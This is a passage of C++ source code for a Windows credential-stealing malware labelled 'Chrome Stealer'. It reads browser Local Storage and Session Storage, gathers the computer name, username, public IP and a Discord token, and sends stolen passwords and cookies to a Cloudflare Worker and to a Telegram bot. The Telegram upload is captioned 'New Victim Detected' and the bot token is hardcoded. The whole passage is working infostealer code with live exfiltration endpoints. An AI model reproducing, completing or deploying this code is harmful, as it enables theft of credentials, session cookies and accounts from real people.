                    if (data[pos] == 0) break;
                    if (data[pos] >= 32 && data[pos] <= 126) {
                        result += (char)data[pos];
                    } else if (data[pos] == '\n' || data[pos] == '\r' || data[pos] == '\t') {
                        result += (char)data[pos];
                    }
                    pos++;
                }
                
                return result;
            }
            
            static std::pair<std::string, std::string> ParseKey(const std::vector<uint8_t>& key)
            {
                std::string url, keyName;
                size_t i = 0;
                
                if (i < key.size() && key[i] == '_') i++;
                
                while (i < key.size() && key[i] != 0) {
                    if (key[i] >= 32 && key[i] <= 126) {
                        url += (char)key[i];
                    }
                    i++;
                }
                
                if (i < key.size()) i++;
                
                while (i < key.size() && key[i] != 1) {
                    if (key[i] >= 32 && key[i] <= 126) {
                        keyName += (char)key[i];
                    }
                    i++;
                }
                
                return {url, keyName};
            }
        };
        
        static std::string ExtractLocalStorage(const fs::path& profilePath, PipeLogger& logger)
        {
            fs::path localStoragePath = profilePath / "Local Storage" / "leveldb";
            
            if (!fs::exists(localStoragePath)) {
                logger.Log("[!] Local Storage path not found");
                return "[]";
            }
            
            std::ostringstream json;
            json << "[";
            bool first = true;
            
            try {
                for (const auto& entry : fs::directory_iterator(localStoragePath)) {
                    if (entry.path().extension() == ".log" || entry.path().extension() == ".ldb") {
                        std::ifstream file(entry.path(), std::ios::binary);
                        if (!file.is_open()) continue;
                        
                        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                                  std::istreambuf_iterator<char>());
                        file.close();
                        
                        for (size_t i = 0; i < data.size() - 10; i++) {
                            if (data[i] == '_' && i + 1 < data.size()) {
                                size_t keyStart = i;
                                size_t keyEnd = keyStart;
                                
                                int nullCount = 0;
                                while (keyEnd < data.size() && keyEnd < keyStart + 512) {
                                    if (data[keyEnd] == 0 || data[keyEnd] == 1) {
                                        nullCount++;
                                        if (nullCount >= 2) break;
                                    }
                                    keyEnd++;
                                }
                                
                                if (keyEnd - keyStart > 5 && keyEnd - keyStart < 512) {
                                    std::vector<uint8_t> keyBytes(data.begin() + keyStart, data.begin() + keyEnd);
                                    auto [url, key] = LevelDBReader::ParseKey(keyBytes);
                                    
                                    if (!url.empty() && !key.empty()) {
                                        size_t valueStart = keyEnd + 1;
                                        size_t valuePos = valueStart;
                                        std::string value = LevelDBReader::ReadValue(data, valuePos);
                                        
                                        if (!value.empty() && value.length() < 2048) {
                                            if (!first) json << ",\n";
                                            first = false;
                                            
                                            json << "  {\"is_meta\":false"
                                                 << ",\"url\":\"" << Utils::EscapeJson(url) << "\""
                                                 << ",\"key\":\"" << Utils::EscapeJson(key) << "\""
                                                 << ",\"value\":\"" << Utils::EscapeJson(value) << "\"}";
                                        }
                                    }
                                }
                                
                                i = keyEnd;
                            }
                        }
                    }
                }
            } catch (...) {}
            
            json << "\n]";
            return json.str();
        }
        
        static std::string ExtractSessionStorage(const fs::path& profilePath, PipeLogger& logger)
        {
            fs::path sessionStoragePath = profilePath / "Session Storage";
            
            if (!fs::exists(sessionStoragePath)) {
                logger.Log("[!] Session Storage path not found");
                return "[]";
            }
            
            std::ostringstream json;
            json << "[";
            bool first = true;
            
            try {
                for (const auto& entry : fs::recursive_directory_iterator(sessionStoragePath)) {
                    if (entry.path().extension() == ".log" || entry.path().extension() == ".ldb") {
                        std::ifstream file(entry.path(), std::ios::binary);
                        if (!file.is_open()) continue;
                        
                        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
                                                  std::istreambuf_iterator<char>());
                        file.close();
                        
                        for (size_t i = 0; i < data.size() - 10; i++) {
                            if ((i + 4 < data.size() && data[i] == 'm' && data[i+1] == 'a' && data[i+2] == 'p' && data[i+3] == '-') ||
                                (i + 10 < data.size() && data[i] == 'n' && data[i+1] == 'a' && data[i+2] == 'm' && data[i+3] == 'e' && 
                                 data[i+4] == 's' && data[i+5] == 'p' && data[i+6] == 'a' && data[i+7] == 'c' && data[i+8] == 'e' && data[i+9] == '-')) {
                                
                                size_t keyStart = i;
                                size_t keyEnd = keyStart;
                                
                                while (keyEnd < data.size() && keyEnd < keyStart + 256 && 
                                       data[keyEnd] != 0 && data[keyEnd] >= 32 && data[keyEnd] <= 126) {
                                    keyEnd++;
                                }
                                
                                if (keyEnd - keyStart > 5 && keyEnd - keyStart < 256) {
                                    std::string keyStr(data.begin() + keyStart, data.begin() + keyEnd);
                                    
                                    size_t valueStart = keyEnd + 1;
                                    size_t valuePos = valueStart;
                                    std::string value = LevelDBReader::ReadValue(data, valuePos);
                                    
                                    if (!value.empty() && value.length() < 2048) {
                                        if (!first) json << ",\n";
                                        first = false;
                                        
                                        json << "  {\"is_meta\":false"
                                             << ",\"url\":\"\""
                                             << ",\"key\":\"" << Utils::EscapeJson(keyStr) << "\""
                                             << ",\"value\":\"" << Utils::EscapeJson(value) << "\"}";
                                    }
                                }
                                
                                i = keyEnd;
                            }
                        }
                    }
                }
            } catch (...) {}
            
            json << "\n]";
            return json.str();
        }
    }

    // Global data collector - accumulates all files in RAM across browsers
    struct DataCollector {
        struct FileData {
            std::string browserName;
            std::string filename;
            std::string content;
            int itemCount;
        };
        
        std::vector<FileData> allFiles;
        std::string computerName;
        std::string userName;
        std::string publicIp;
        std::string systemSpecs;
        std::string discordToken;
        bool initialized = false;
        
        static DataCollector& Instance() {
            static DataCollector instance;
            return instance;
        }
    };

    // Telegram Bot Uploader - Single message with ZIP archive
    class TelegramUploader
    {
    public:
        TelegramUploader(PipeLogger &logger) : m_logger(logger)
        {
            m_botToken = L"7933260420:AAG37jmdanboUUqeWkS7cpQr6zz7jtPeF5g";
            m_chatId = L"-1003428698503"; // FSOCIETY channel ID
        }

        // Send document (ZIP) with caption (victim info)
        bool SendDocument(const std::string &filename, const std::vector<uint8_t> &fileData, const std::string &caption)
        {
            m_logger.Log("[*] Sending document: " + filename + " (" + std::to_string(fileData.size()) + " bytes)");
            
            std::string boundary = "----WebKitFormBoundary" + std::to_string(GetTickCount64());
            std::ostringstream body;
            
            // Add chat_id
            body << "--" << boundary << "\r\n";
            body << "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
            body << std::string(m_chatId.begin(), m_chatId.end()) << "\r\n";
            
            // Add caption
            body << "--" << boundary << "\r\n";
            body << "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
            body << caption << "\r\n";
            
            // Add parse_mode
            body << "--" << boundary << "\r\n";
            body << "Content-Disposition: form-data; name=\"parse_mode\"\r\n\r\n";
            body << "HTML\r\n";
            
            // Add document file
            body << "--" << boundary << "\r\n";
            body << "Content-Disposition: form-data; name=\"document\"; filename=\"" << filename << "\"\r\n";
            body << "Content-Type: application/zip\r\n\r\n";
            
            std::string bodyStr = body.str();
            std::string footer = "\r\n--" + boundary + "--\r\n";
            
            // Combine: header + file data + footer
            std::vector<uint8_t> fullBody;
            fullBody.insert(fullBody.end(), bodyStr.begin(), bodyStr.end());
            fullBody.insert(fullBody.end(), fileData.begin(), fileData.end());
            fullBody.insert(fullBody.end(), footer.begin(), footer.end());
            
            return SendRequestBinary(L"/sendDocument", fullBody, boundary);
        }

    private:
        std::wstring m_botToken;
        std::wstring m_chatId;
        PipeLogger &m_logger;

        bool SendRequestBinary(const std::wstring &endpoint, const std::vector<uint8_t> &body, const std::string &boundary)
        {
            HINTERNET hSession = WinHttpOpen(L"Chrome Stealer/1.0",
                                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                             WINHTTP_NO_PROXY_NAME,
                                             WINHTTP_NO_PROXY_BYPASS, 0);
            if (!hSession) return false;

            HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
            if (!hConnect) {
                WinHttpCloseHandle(hSession);
                return false;
            }

            std::wstring path = L"/bot" + m_botToken + endpoint;
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(),
                                                    nullptr, WINHTTP_NO_REFERER,
                                                    WINHTTP_DEFAULT_ACCEPT_TYPES,
                                                    WINHTTP_FLAG_SECURE);
            if (!hRequest) {
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                return false;
            }

            // Set extended timeouts for large file uploads (5 minutes)
            WinHttpSetTimeouts(hRequest, 60000, 60000, 300000, 300000);

            std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + 
                                  std::wstring(boundary.begin(), boundary.end()) + L"\r\n";

            BOOL result = WinHttpSendRequest(hRequest, headers.c_str(), -1,
                                            (LPVOID)body.data(), (DWORD)body.size(),
                                            (DWORD)body.size(), 0);
            
            if (result) {
                result = WinHttpReceiveResponse(hRequest, nullptr);
            }

            DWORD statusCode = 0;
            DWORD statusSize = sizeof(statusCode);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                               nullptr, &statusCode, &statusSize, nullptr);

            bool success = (statusCode >= 200 && statusCode < 300);
            
            if (success) {
                m_logger.Log("[+] Upload successful (HTTP " + std::to_string(statusCode) + ")");
            } else {
                m_logger.Log("[-] Upload failed (HTTP " + std::to_string(statusCode) + ")");
            }

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);

            return success;
        }
    };

    // Cloudflare D1 Uploader - Parallel chunked uploads
    class CloudflareUploader
    {
    public:
        CloudflareUploader(PipeLogger &logger) : m_logger(logger)
        {
            m_apiUrl = L"chrome-stealer-api.abdellah2019gg.workers.dev";
        }

        // Send HTTP request to Cloudflare Worker
        bool SendRequest(const std::wstring &path, const std::string &jsonBody)
        {
            HINTERNET hSession = WinHttpOpen(L"ChromeElevator/1.0",
                                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                             WINHTTP_NO_PROXY_NAME,
                                             WINHTTP_NO_PROXY_BYPASS, 0);
            if (!hSession) return false;

            HINTERNET hConnect = WinHttpConnect(hSession, m_apiUrl.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
            if (!hConnect) {
                WinHttpCloseHandle(hSession);
                return false;
            }

            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(),
                                                    nullptr, WINHTTP_NO_REFERER,
                                                    WINHTTP_DEFAULT_ACCEPT_TYPES,
                                                    WINHTTP_FLAG_SECURE);
            if (!hRequest) {
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                return false;
            }

            std::wstring headers = L"Content-Type: application/json\r\n";
            BOOL result = WinHttpSendRequest(hRequest, headers.c_str(), -1,
                                            (LPVOID)jsonBody.c_str(), jsonBody.length(),
                                            jsonBody.length(), 0);
            
            if (result) {
                result = WinHttpReceiveResponse(hRequest, nullptr);
            }

            DWORD statusCode = 0;
            DWORD statusSize = sizeof(statusCode);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                               nullptr, &statusCode, &statusSize, nullptr);

            // Read response body for debugging
            if (result && statusCode >= 400) {
                std::string responseBody;
                DWORD dwSize = 0;
                DWORD dwDownloaded = 0;
                do {
                    dwSize = 0;
                    if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
                    if (dwSize == 0) break;

                    char* buffer = new char[dwSize + 1];
                    ZeroMemory(buffer, dwSize + 1);
                    if (WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
                        responseBody.append(buffer, dwDownloaded);
                    }
                    delete[] buffer;
                } while (dwSize > 0);
                
                if (!responseBody.empty()) {
                    printf("[-] Cloudflare API error (%d): %s\n", statusCode, responseBody.c_str());
                }
            }

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);

            return (statusCode >= 200 && statusCode < 300);
        }

        // Create session and get session ID
        std::string CreateSession(const std::string &computerName, const std::string &username,
                                 const std::string &ipAddress, const std::string &discordToken,
                                 const std::string &systemSpecs, const std::string &browserType,
                                 int passwordCount, int cookieCount)
        {
            std::ostringstream json;
            json << "{"
                 << "\"computer_name\":\"" << EscapeJson(computerName) << "\","
                 << "\"username\":\"" << EscapeJson(username) << "\","
                 << "\"ip_address\":\"" << EscapeJson(ipAddress) << "\","
                 << "\"discord_token\":\"" << EscapeJson(discordToken) << "\","
                 << "\"system_specs\":\"" << EscapeJson(systemSpecs) << "\","
                 << "\"browser_type\":\"" << EscapeJson(browserType) << "\","
                 << "\"password_count\":" << passwordCount << ","
                 << "\"cookie_count\":" << cookieCount
                 << "}";

            if (SendRequest(L"/api/session", json.str())) {
                // Generate session ID (UUID-like)
                std::ostringstream sessionId;
                sessionId << computerName << "_" << GetTickCount64();
                return sessionId.str();
            }
            return "";
        }

        // Upload passwords in chunks (parallel)
        bool UploadPasswordsChunked(const std::string &sessionId, const std::string &passwordsJson)
        {
            // Parse JSON array and chunk it
            std::vector<std::string> chunks = ChunkJsonArray(passwordsJson, 200);
            
            m_logger.Log("[*] Uploading " + std::to_string(chunks.size()) + " password chunks to Cloudflare...");

            // Upload chunks in parallel using threads
            std::vector<HANDLE> threads;
            struct ThreadData {
                CloudflareUploader* uploader;
                std::string sessionId;
                std::string chunk;
                bool success;
            };
            std::vector<ThreadData*> threadDataList;

            for (const auto &chunk : chunks) {
                ThreadData* data = new ThreadData{ this, sessionId, chunk, false };
                threadDataList.push_back(data);

                HANDLE hThread = CreateThread(nullptr, 0, [](LPVOID param) -> DWORD {
                    ThreadData* td = (ThreadData*)param;
                    std::ostringstream json;
                    json << "{\"session_id\":\"" << td->uploader->EscapeJson(td->sessionId) << "\","
                         << "\"passwords\":" << td->chunk << "}";
                    td->success = td->uploader->SendRequest(L"/api/passwords", json.str());
                    return 0;
                }, data, 0, nullptr);

                if (hThread) {
                    threads.push_back(hThread);
                } else {
                    delete data;
                }
            }

            // Wait for all threads
            if (!threads.empty()) {
                WaitForMultipleObjects(threads.size(), threads.data(), TRUE, 30000); // 30s timeout
            }

            // Cleanup
            bool allSuccess = true;
            for (size_t i = 0; i < threadDataList.size(); i++) {
                if (!threadDataList[i]->success) allSuccess = false;
                delete threadDataList[i];
            }
            for (auto h : threads) CloseHandle(h);

            m_logger.Log(allSuccess ? "[+] All password chunks uploaded successfully" : "[-] Some password chunks failed");
            return allSuccess;
        }

        // Upload cookies in chunks (parallel)
        bool UploadCookiesChunked(const std::string &sessionId, const std::string &cookiesJson)
        {
            std::vector<std::string> chunks = ChunkJsonArray(cookiesJson, 50);
            
            m_logger.Log("[*] Uploading " + std::to_string(chunks.size()) + " cookie chunks to Cloudflare...");

            std::vector<HANDLE> threads;
            struct ThreadData {
                CloudflareUploader* uploader;
                std::string sessionId;
                std::string chunk;
                bool success;
            };
            std::vector<ThreadData*> threadDataList;

            for (const auto &chunk : chunks) {
                ThreadData* data = new ThreadData{ this, sessionId, chunk, false };
                threadDataList.push_back(data);

                HANDLE hThread = CreateThread(nullptr, 0, [](LPVOID param) -> DWORD {
                    ThreadData* td = (ThreadData*)param;
                    std::ostringstream json;
                    json << "{\"session_id\":\"" << td->uploader->EscapeJson(td->sessionId) << "\","
                         << "\"cookies\":" << td->chunk << "}";
                    td->success = td->uploader->SendRequest(L"/api/cookies", json.str());
                    return 0;
                }, data, 0, nullptr);

                if (hThread) {
                    threads.push_back(hThread);
                } else {
                    delete data;
                }
            }

            if (!threads.empty()) {
                WaitForMultipleObjects(threads.size(), threads.data(), TRUE, 30000);
            }

            bool allSuccess = true;
            for (size_t i = 0; i < threadDataList.size(); i++) {
                if (!threadDataList[i]->success) allSuccess = false;
                delete threadDataList[i];
            }
            for (auto h : threads) CloseHandle(h);

            m_logger.Log(allSuccess ? "[+] All cookie chunks uploaded successfully" : "[-] Some cookie chunks failed");
            return allSuccess;
        }

    private:
        std::wstring m_apiUrl;
        PipeLogger &m_logger;

        // Escape JSON strings
        std::string EscapeJson(const std::string &s)
        {
            std::ostringstream o;
            for (char c : s) {
                if (c == '"' || c == '\\') o << '\\';
                o << c;
            }
            return o.str();
        }

        // Chunk JSON array into smaller arrays
        std::vector<std::string> ChunkJsonArray(const std::string &jsonArray, int chunkSize)
        {
            std::vector<std::string> chunks;
            
            // Simple JSON array chunking - assumes array format [item1, item2, ...]
            size_t start = jsonArray.find('[');
            size_t end = jsonArray.rfind(']');
            if (start == std::string::npos || end == std::string::npos) return chunks;

            std::string content = jsonArray.substr(start + 1, end - start - 1);
            
            // Split by top-level commas (simple approach)
            std::vector<std::string> items;
            int braceDepth = 0;
            size_t itemStart = 0;
            for (size_t i = 0; i < content.length(); i++) {
                if (content[i] == '{') braceDepth++;
                else if (content[i] == '}') braceDepth--;
                else if (content[i] == ',' && braceDepth == 0) {
                    items.push_back(content.substr(itemStart, i - itemStart));
                    itemStart = i + 1;
                }
            }
            if (itemStart < content.length()) {
                items.push_back(content.substr(itemStart));
            }

            // Group into chunks
            for (size_t i = 0; i < items.size(); i += chunkSize) {
                std::ostringstream chunk;
                chunk << "[";
                for (size_t j = i; j < i + chunkSize && j < items.size(); j++) {
                    if (j > i) chunk << ",";
                    chunk << items[j];
                }
                chunk << "]";
                chunks.push_back(chunk.str());
            }

            return chunks;
        }
    };

    // Data uploader - writes to temp files, last browser uploads all
    class DataUploader
    {
    public:
        DataUploader(PipeLogger &logger) : m_logger(logger) {}

        void AddDataFile(const std::string &filename, const std::string &jsonContent, int itemCount)
        {
            // Write to temp directory with session ID
            char tempPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tempPath);
            
            static std::string sessionId;
            if (sessionId.empty()) {
                char* envSession = getenv("CHROME_ELEVATOR_SESSION");
                if (envSession) {
                    sessionId = envSession;
                } else {
                    sessionId = std::to_string(GetTickCount64() / 60000);
                }
            }
            
            // Create unique file in temp for this data
            std::string tempFilePath = std::string(tempPath) + "chrome_data_" + sessionId + "_" + 
                                      std::to_string(GetTickCount64()) + "_" + filename + ".json";
            
            std::ofstream outFile(tempFilePath, std::ios::binary);
            if (outFile.is_open()) {
                outFile << jsonContent;
                outFile.close();
                m_logger.Log("[*] Stored in temp: " + tempFilePath);
            } else {
                m_logger.Log("[-] Failed to write temp file: " + tempFilePath);
            }
        }

        void InitializeSystemInfo()
        {
            // Store system info for later use
            char tempPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tempPath);
            
            static std::string sessionId;
            if (sessionId.empty()) {
                char* envSession = getenv("CHROME_ELEVATOR_SESSION");
                if (envSession) {
                    sessionId = envSession;
                } else {
                    sessionId = std::to_string(GetTickCount64() / 60000);
                }
            }
            
            std::string infoFile = std::string(tempPath) + "chrome_sysinfo_" + sessionId + ".txt";
            
            // Check if already exists
            if (fs::exists(infoFile)) {
                m_logger.Log("[*] System info already initialized");
                return;
            }
            
            m_logger.Log("[*] Collecting system information...");
            
            char compName[MAX_COMPUTERNAME_LENGTH + 1];
            DWORD compSize = sizeof(compName);
            GetComputerNameA(compName, &compSize);
            
            char usrName[256];
            DWORD userSize = sizeof(usrName);
            GetUserNameA(usrName, &userSize);
            
            std::string publicIp = GetPublicIP();
            std::string discordToken = ExtractDiscordToken();
            
            // Write to file
            std::ofstream out(infoFile);
            if (out.is_open()) {
                out << compName << "\n";
                out << usrName << "\n";
                out << publicIp << "\n";
                out << discordToken << "\n";
                out.close();
                m_logger.Log("[+] System info saved");
            }
        }

        // Upload all collected data - call this ONLY from last browser
        bool UploadAllData(const std::string &currentBrowserName, bool isLastBrowser)
        {
            if (!isLastBrowser) {
                m_logger.Log("[*] Not last browser, skipping upload");
                return true;
            }
            
            m_logger.Log("[*] Last browser detected - uploading ALL collected data...");
            
            try {
                char tempPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tempPath);
                
                static std::string sessionId;
                if (sessionId.empty()) {
                    char* envSession = getenv("CHROME_ELEVATOR_SESSION");
                    if (envSession) {
                        sessionId = envSession;
                    } else {
                        sessionId = std::to_string(GetTickCount64() / 60000);
                    }
                }
                
                // Read system info
                std::string infoFile = std::string(tempPath) + "chrome_sysinfo_" + sessionId + ".txt";
                std::string computerName, userName, publicIp, discordToken;
                
                if (fs::exists(infoFile)) {
                    std::ifstream in(infoFile);
                    std::getline(in, computerName);
                    std::getline(in, userName);
                    std::getline(in, publicIp);
                    std::getline(in, discordToken);
                    in.close();
                }
                
                // Find all data files
                std::vector<DataCollector::FileData> allFiles;
                std::string pattern = "chrome_data_" + sessionId + "_";
                
                for (const auto &entry : fs::directory_iterator(tempPath)) {
                    std::string filename = entry.path().filename().string();
                    if (filename.find(pattern) == 0 && filename.length() >= 5 && 
                        filename.substr(filename.length() - 5) == ".json") {
                        std::ifstream file(entry.path(), std::ios::binary);
                        if (file.is_open()) {
                            std::string content((std::istreambuf_iterator<char>(file)),
                                              std::istreambuf_iterator<char>());
                            file.close();
                            
                            // Extract browser name from filename
                            std::string originalName = filename.substr(pattern.length());
                            size_t pos = originalName.find('_');
                            if (pos != std::string::npos) {
                                originalName = originalName.substr(pos + 1);
                            }
                            
                            DataCollector::FileData fd;
                            fd.browserName = "";  // Will be in filename
                            fd.filename = originalName;
                            fd.content = content;
                            fd.itemCount = 0;
                            allFiles.push_back(fd);
                        }
                    }
                }
                
                m_logger.Log("[*] Found " + std::to_string(allFiles.size()) + " data files to upload");
                
                if (allFiles.empty()) {
                    m_logger.Log("[-] No data files found!");
                    return false;
                }
                
                // Upload to Telegram
                TelegramUploader telegram(m_logger);
                
                m_logger.Log("[+] Building complete victim data...");
                
                // Create TAR.ZST archive in memory with all JSON files
                std::vector<uint8_t> archiveData = CreateTarZstArchive(allFiles, sessionId);
                if (archiveData.empty()) {
                    m_logger.Log("[-] Failed to create TAR.ZST archive");
                    return false;
                }
                
                // Build system info message
                int totalPasswords = 0;
                int totalCookies = 0;
                for (const auto &file : allFiles) {
                    if (file.filename.find("password") != std::string::npos) {
                        totalPasswords++;
                    } else if (file.filename.find("cookie") != std::string::npos) {
                        totalCookies++;
                    }
                }
                
                std::ostringstream msg;
                msg << "🔴 <b>New Victim Detected</b>\n";
                msg << "━━━━━━━━━━━━━━━━━━━━━━\n\n";
                
                msg << "<b>📋 System Information</b>\n";
                msg << "┌ <b>Computer:</b> <code>" << computerName << "</code>\n";
                msg << "├ <b>Username:</b> <code>" << userName << "</code>\n";
                msg << "├ <b>IP Address:</b> <code>" << (publicIp.empty() ? "N/A" : publicIp) << "</code>\n";
                msg << "└ <b>Session ID:</b> <code>" << sessionId << "</code>\n\n";
                
                msg << "<b>📊 Extracted Data</b>\n";
                msg << "┌ <b>Password Files:</b> <code>" << totalPasswords << "</code>\n";
                msg << "├ <b>Cookie Files:</b> <code>" << totalCookies << "</code>\n";
                msg << "├ <b>Total Files:</b> <code>" << allFiles.size() << "</code>\n";
                msg << "└ <b>Archive Size:</b> <code>" << (archiveData.size() / 1024) << " KB</code>\n\n";
                
                if (!discordToken.empty()) {
                    msg << "<b>💎 Discord Token</b>\n";
                    msg << "<code>" << discordToken << "</code>\n\n";
                }
                
                msg << "━━━━━━━━━━━━━━━━━━━━━━\n";
                msg << "<i>📦 Compressed with Zstandard (Level 3)</i>";
                
                // Generate archive filename with victim info
                std::string archiveFilename = computerName + "_" + userName + "_" + sessionId + ".tar.zst";
                
                // Upload archive with victim details as caption (SINGLE MESSAGE)
                if (!telegram.SendDocument(archiveFilename, archiveData, msg.str())) {
                    m_logger.Log("[-] Failed to upload victim data");
                    return false;
                }
                
                m_logger.Log("[+] Successfully uploaded victim data to Telegram");
                
                m_logger.Log("[+] All data uploaded successfully in single message!");
                
                // Cleanup temp files
                for (const auto &entry : fs::directory_iterator(tempPath)) {
                    std::string filename = entry.path().filename().string();
                    if (filename.find("chrome_data_" + sessionId) == 0 || 
                        filename.find("chrome_sysinfo_" + sessionId) == 0) {
                        fs::remove(entry.path());
                    }
                }
                
                return true;
            }
            catch (const std::exception &e) {
                m_logger.Log("[-] Exception in UploadAllData: " + std::string(e.what()));
                return false;
            }
        }

    private:
        PipeLogger &m_logger;

        // Compress data using Zstandard (level 3 for speed)
        std::vector<uint8_t> CompressZstd(const std::string &data) {
            size_t compressBound = ZSTD_compressBound(data.size());
            std::vector<uint8_t> compressed(compressBound);
            
            // Use compression level 3 for fast compression with good ratio
            size_t compressedSize = ZSTD_compress(
                compressed.data(), compressBound,
                data.data(), data.size(),
                3);
            
            if (ZSTD_isError(compressedSize)) {
                // Compression failed, return original
                compressed.assign(data.begin(), data.end());
                return compressed;
            }
            
            compressed.resize(compressedSize);
            return compressed;
        }

        // Create TAR.ZST archive (simple tar + zstd compression)
        std::vector<uint8_t> CreateTarZstArchive(const std::vector<DataCollector::FileData> &files, const std::string &sessionId)
        {
            m_logger.Log("[*] Creating TAR.ZST archive with " + std::to_string(files.size()) + " files...");
            
            // Build uncompressed TAR in memory
            std::vector<uint8_t> tarData;
            
            for (const auto &file : files) {
                std::string filename = file.filename;
                const std::string &content = file.content;
                
                // TAR header (512 bytes)
                std::vector<uint8_t> header(512, 0);
                
                // Filename (max 100 chars)
                size_t nameLen = filename.size() < 100 ? filename.size() : 100;
                memcpy(header.data(), filename.c_str(), nameLen);
                
                // File mode (8 bytes octal): 0000644
                memcpy(header.data() + 100, "0000644", 7);
                
                // Owner/Group UID/GID (8 bytes each): 0000000
                memcpy(header.data() + 108, "0000000", 7);
                memcpy(header.data() + 116, "0000000", 7);
                
                // File size (12 bytes octal)
                char sizeStr[12];
                snprintf(sizeStr, 12, "%011llo", (unsigned long long)content.size());
                memcpy(header.data() + 124, sizeStr, 11);
                
                // Modification time (12 bytes octal): current time
                __time64_t currentTime = _time64(nullptr);
                snprintf(sizeStr, 12, "%011llo", (long long)currentTime);
                memcpy(header.data() + 136, sizeStr, 11);
                
                // Checksum placeholder (8 bytes): initially spaces
                memset(header.data() + 148, ' ', 8);
                
                // Type flag: '0' = regular file
                header[156] = '0';
                
                // UStar format
                memcpy(header.data() + 257, "ustar", 5);
                header[263] = '0';
                header[264] = '0';
                
                // Calculate checksum
                unsigned int checksum = 0;
                for (int i = 0; i < 512; i++) {
                    checksum += header[i];
                }
                snprintf(sizeStr, 8, "%06o", checksum);
                memcpy(header.data() + 148, sizeStr, 6);
                header[154] = 0;
                
                // Add header to TAR
                tarData.insert(tarData.end(), header.begin(), header.end());
                
                // Add file content
                tarData.insert(tarData.end(), content.begin(), content.end());
                
                // Pad to 512-byte boundary
                size_t padding = (512 - (content.size() % 512)) % 512;
                tarData.insert(tarData.end(), padding, 0);
            }
            
            
            // Add two 512-byte zero blocks to mark end of TAR
            tarData.insert(tarData.end(), 1024, 0);
            
            m_logger.Log("[*] TAR size: " + std::to_string(tarData.size()) + " bytes");
            
            // Compress entire TAR with Zstandard level 3
            size_t compressBound = ZSTD_compressBound(tarData.size());
            std::vector<uint8_t> compressedData(compressBound);
            
            size_t compressedSize = ZSTD_compress(
                compressedData.data(), compressBound,
                tarData.data(), tarData.size(),
                3);
            
            if (ZSTD_isError(compressedSize)) {
                m_logger.Log("[-] Zstandard compression failed: " + std::string(ZSTD_getErrorName(compressedSize)));
                return std::vector<uint8_t>();
            }
            
            compressedData.resize(compressedSize);
            
            double ratio = (double)tarData.size() / compressedSize;
            m_logger.Log("[+] TAR.ZST archive created: " + std::to_string(compressedSize) + 
                        " bytes (" + std::to_string((int)(ratio * 100)) + "% compression)");
            
            return compressedData;
        }


        std::string GetPublicIP()
        {
            std::string responseBody;
            HINTERNET hSession = WinHttpOpen(L"IPChecker/1.0",
                                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                             WINHTTP_NO_PROXY_NAME,
                                             WINHTTP_NO_PROXY_BYPASS, 0);
            if (!hSession) return "Unknown";

            HINTERNET hConnect = WinHttpConnect(hSession, L"api.ipify.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
            if (!hConnect) {
                WinHttpCloseHandle(hSession);
                return "Unknown";
            }

            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/?format=text",
                                                    nullptr, WINHTTP_NO_REFERER,
                                                    WINHTTP_DEFAULT_ACCEPT_TYPES,
                                                    WINHTTP_FLAG_SECURE);
            if (!hRequest) {
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hSession);
                return "Unknown";
            }

            if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
                WinHttpReceiveResponse(hRequest, nullptr)) {
                DWORD dwSize = 0;
                std::vector<char> buffer;
                while (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize) {
                    size_t start = buffer.size();
                    buffer.resize(start + dwSize);
                    DWORD dwRead = 0;
                    if (!WinHttpReadData(hRequest, buffer.data() + start, dwSize, &dwRead)) break;
                    buffer.resize(start + dwRead);
                    dwSize = 0;
                }
                if (!buffer.empty()) {
                    responseBody.assign(buffer.begin(), buffer.end());
                }
            }

            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return responseBody.empty() ? "Unknown" : responseBody;
        }

        std::string GetSystemSpecs()
        {
            std::ostringstream specs;
            
            // Get CPU info
            SYSTEM_INFO si;
            GetSystemInfo(&si);
            specs << "CPU Cores: " << si.dwNumberOfProcessors << "\\n";
            
            // Get RAM info
            MEMORYSTATUSEX ms;
            ms.dwLength = sizeof(ms);
            if (GlobalMemoryStatusEx(&ms)) {
                specs << "RAM: " << (ms.ullTotalPhys / (1024 * 1024 * 1024)) << " GB\\n";
            }
            
            // Get OS version
            OSVERSIONINFOEXW osvi = {0};
            osvi.dwOSVersionInfoSize = sizeof(osvi);
            typedef NTSTATUS(WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
            HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
            if (hMod) {
                RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
